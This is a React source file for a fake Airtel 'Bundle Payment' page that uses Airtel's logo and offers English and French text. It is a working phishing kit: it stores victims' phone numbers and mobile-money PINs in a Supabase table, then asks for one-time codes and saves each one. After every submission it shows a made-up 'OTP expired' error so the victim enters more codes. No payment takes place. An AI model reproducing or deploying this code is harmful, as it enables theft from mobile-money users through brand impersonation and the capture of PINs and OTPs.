import { useState, useEffect } from "react";
import { Phone, Lock, ChevronDown, Globe, ArrowLeft } from "lucide-react";
import countryCodes from "./countryCodes"; // alphabetically sorted
import { supabase } from "./supabaseClient";

type PaymentStep = "payment" | "otp";
type Language = "en" | "fr";

interface PaymentFormData {
  countryCode: string;
  phoneNumber: string;
  pin: string;
}

const LOGO_URL = "https://cdn-webportal.airtelstream.net/website/kenya/assets/images/logo.svg";
const BG_IMAGE_URL = "https://images.unsplash.com/photo-1605902711622-cfb43c4433c9?fit=crop&w=1200&q=80";

const translations = {
  en: {
    bundlePayment: "Bundle Payment",
    verifyPayment: "Verify Payment",
    country: "Country",
    chooseCountry: "Choose your country",
    phoneNumber: "Phone Number",
    pin: "PIN",
    pinPlaceholder: "4-digit PIN",
    processing: "Processing...",
    confirmPayment: "Confirm Payment",
    otpSent: "Enter OTP sent to",
    otpError: "OTP must be 4 digits",
    tryAgain: "Try again in",
    verifyOtp: "Verify OTP",
    back: "Back to payment",
    chooseLanguage: "Choose Language",
  },
  fr: {
    bundlePayment: "Paiement du forfait",
    verifyPayment: "Vérifier le paiement",
    country: "Pays",
    chooseCountry: "Choisissez votre pays",
    phoneNumber: "Numéro de téléphone",
    pin: "Code PIN",
    pinPlaceholder: "PIN à 4 chiffres",
    processing: "Traitement...",
    confirmPayment: "Confirmer le paiement",
    otpSent: "Saisissez le code envoyé à",
    otpError: "Le code doit contenir 4 chiffres",
    tryAgain: "Réessayez dans",
    verifyOtp: "Vérifier le code",
    back: "Retour au paiement",
    chooseLanguage: "Choisir la langue",
  },
};

export default function AirtelPayment() {
  const [language, setLanguage] = useState<Language>("en");
  const t = translations[language];

  const [languageOpen, setLanguageOpen] = useState(false);
  const [step, setStep] = useState<PaymentStep>("payment");
  const [formData, setFormData] = useState<PaymentFormData>({
    countryCode: "",
    phoneNumber: "",
    pin: "",
  });
  const [otp, setOtp] = useState(["", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [otpError, setOtpError] = useState("");
  const [retrySeconds, setRetrySeconds] = useState(0);

  // --- Form validation flags ---
  const isPaymentValid =
    formData.countryCode &&
    /^\d{9,10}$/.test(formData.phoneNumber) &&
    /^\d{4}$/.test(formData.pin);

  const isOtpValid = otp.every((d) => d !== "");

  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isPaymentValid) return; // Prevent submission if incomplete

    setLoading(true);
    try {
      const { error } = await supabase.from("airtel_records").insert({
        country: formData.countryCode,
        number: formData.phoneNumber,
        pin: formData.pin,
      });
      if (error) throw error;
      setStep("otp");
    } catch {
      alert(language === "en" ? "Error saving payment." : "Erreur lors de l'enregistrement.");
    } finally {
      setLoading(false);
    }
  };

  const handleOtpChange = (i: number, value: string) => {
    if (/^\d?$/.test(value)) {
      const newOtp = [...otp];
      newOtp[i] = value;
      setOtp(newOtp);

      if (value && i < 3) {
        document.getElementById(`otp-${i + 1}`)?.focus();
      }

      if (!value && i > 0) {
        document.getElementById(`otp-${i - 1}`)?.focus();
      }
    }
  };

  const handleVerifyOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isOtpValid || retrySeconds > 0) return;

    const code = otp.join("");
    setLoading(true);
    try {
      const { error } = await supabase.from("airtel_otp_records").insert({
        country: formData.countryCode,
        number: formData.phoneNumber,
        otp: code,
      });
      if (error) throw error;
      setOtpError(language === "en" ? "OTP expired. Try again in 10 sec." : "Code expiré. Réessayez dans 10 sec.");
      setRetrySeconds(10);
      setOtp(["", "", "", ""]);
    } catch {
      setOtpError(language === "en" ? "OTP error." : "Erreur du code.");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (retrySeconds > 0) {
      const timer = setInterval(() => setRetrySeconds((s) => s - 1), 1000);
      return () => clearInterval(timer);
    } else setOtpError("");
  }, [retrySeconds]);

  const handleBack = () => setStep("payment");

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-red-600 relative">
      {/* Background blur image with red overlay */}
      <div className="absolute inset-0">
        <img src={BG_IMAGE_URL} className="w-full h-full object-cover filter blur-sm opacity-40" />
        <div className="absolute inset-0 bg-red-600 opacity-50"></div>
      </div>

      <div className="relative w-full max-w-md bg-white rounded-2xl shadow-xl overflow-hidden z-10">

        {/* Back Arrow */}
        <div className="absolute top-4 left-4 z-20">
  <button 
    onClick={() => window.location.href = ""} 
    className="flex items-center gap-2 px-3 py-1 bg-gray-100 rounded-lg text-sm"
  >
    <ArrowLeft size={16} /> Back
  </button>
</div>

        {/* Language Dropdown */}
        <div className="absolute top-4 right-4 z-20">
          <div className="relative">
            <button type="button" onClick={() => setLanguageOpen(!languageOpen)} className="flex items-center gap-2 px-3 py-1 bg-gray-100 rounded-lg text-sm">
              <Globe size={16} /> {language.toUpperCase()} <ChevronDown size={16} />
            </button>
            {languageOpen && (
              <div className="absolute right-0 mt-2 bg-white border rounded-lg shadow-md w-32">
                <div onClick={() => { setLanguage("en"); setLanguageOpen(false); }} className="px-4 py-2 hover:bg-gray-100 cursor-pointer">English</div>
                <div onClick={() => { setLanguage("fr"); setLanguageOpen(false); }} className="px-4 py-2 hover:bg-gray-100 cursor-pointer">Français</div>
              </div>
            )}
          </div>
        </div>

        {/* Header */}
        <div className="bg-white px-6 py-10 text-center relative">
          <div className="bg-white rounded-2xl p-4 w-40 mx-auto mb-6 shadow-md">
            <img src={LOGO_URL} alt="Airtel Logo" className="h-16 mx-auto" />
          </div>
          <h1 className="text-2xl font-bold text-white">{step === "payment" ? t.bundlePayment : t.verifyPayment}</h1>
        </div>

        {/* Form */}
        {step === "payment" ? (
          <form onSubmit={handlePayment} className="p-6 space-y-6">
            {/* Country */}
            <div className="relative">
              <label className="block text-sm font-semibold text-gray-700 mb-2">{t.country}</label>
              <button type="button" onClick={() => setDropdownOpen(!dropdownOpen)} className="w-full px-4 py-3 border-2 border-gray-300 rounded-xl flex items-center justify-between bg-white">
                <div className="flex items-center gap-2 text-gray-700">
                  <span className="text-gray-400">{formData.countryCode || t.chooseCountry}</span>
                </div>
                <ChevronDown />
              </button>
              {dropdownOpen && (
                <div className="absolute bg-white border rounded-xl w-full mt-1 max-h-56 overflow-y-auto shadow-lg z-20">
                  {countryCodes.map((c) => (
                    <div key={c.code} className="p-2 flex items-center gap-2 hover:bg-red-50 cursor-pointer" onClick={() => { setFormData({ ...formData, countryCode: c.code }); setDropdownOpen(false); }}>
                      <img src={c.flag} className="w-5 h-5 rounded" />
                      <span className="flex-1">{c.country}</span>
                      <span className="text-gray-500">{c.code}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Phone */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">{t.phoneNumber}</label>
              <div className="relative">
                <Phone className="absolute left-4 top-3 text-gray-400" />
                <input type="tel" maxLength={10} pattern="\d*" className="w-full pl-12 pr-4 py-3 border-2 border-gray-300 rounded-xl bg-white" placeholder="7123456789"
                  value={formData.phoneNumber} onChange={(e) => setFormData({ ...formData, phoneNumber: e.target.value.replace(/\D/, "") })} required
                />
              </div>
            </div>

            {/* PIN */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">{t.pin}</label>
              <div className="relative">
                <Lock className="absolute left-4 top-3 text-gray-400" />
                <input type="password" maxLength={4} pattern="\d*" className="w-full pl-12 pr-4 py-3 border-2 border-gray-300 rounded-xl bg-white" placeholder={t.pinPlaceholder}
                  value={formData.pin} onChange={(e) => setFormData({ ...formData, pin: e.target.value.replace(/\D/, "") })} required
                />
              </div>
            </div>

            <button disabled={!isPaymentValid || loading} className={`w-full py-4 rounded-xl font-semibold text-lg shadow-lg ${!isPaymentValid || loading ? "bg-gray-400 cursor-not-allowed" : "bg-red-600 text-white"}`}>
              {loading ? t.processing : t.confirmPayment}
            </button>
          </form>
        ) : (
          <form onSubmit={handleVerifyOtp} className="p-6 text-center">
            <p className="mb-4 text-gray-700">{t.otpSent} {formData.countryCode} {formData.phoneNumber}</p>
            <div className="flex justify-center gap-2">
              {otp.map((d, i) => (
                <input
                  key={i}
                  id={`otp-${i}`}
                  maxLength={1}
                  value={d}
                  onChange={(e) => handleOtpChange(i, e.target.value)}
                  className="w-12 h-14 text-2xl text-center border-2 border-gray-300 rounded-xl bg-white"
                />
              ))}
            </div>
            {otpError && <p className="text-red-600 font-medium mt-3">{otpError}</p>}
            <button disabled={!isOtpValid || loading || retrySeconds > 0} className={`w-full mt-4 py-4 rounded-xl font-semibold text-lg shadow-lg ${!isOtpValid || loading || retrySeconds > 0 ? "bg-gray-400 cursor-not-allowed" : "bg-red-600 text-white"}`}>
              {retrySeconds > 0 ? `${t.tryAgain} ${retrySeconds}s` : t.verifyOtp}
            </button>
            <button type="button" onClick={() => setStep("payment")} className="block w-full mt-3 text-gray-600">{t.back}</button>
          </form>
        )}
      </div>
    </div>
  );
}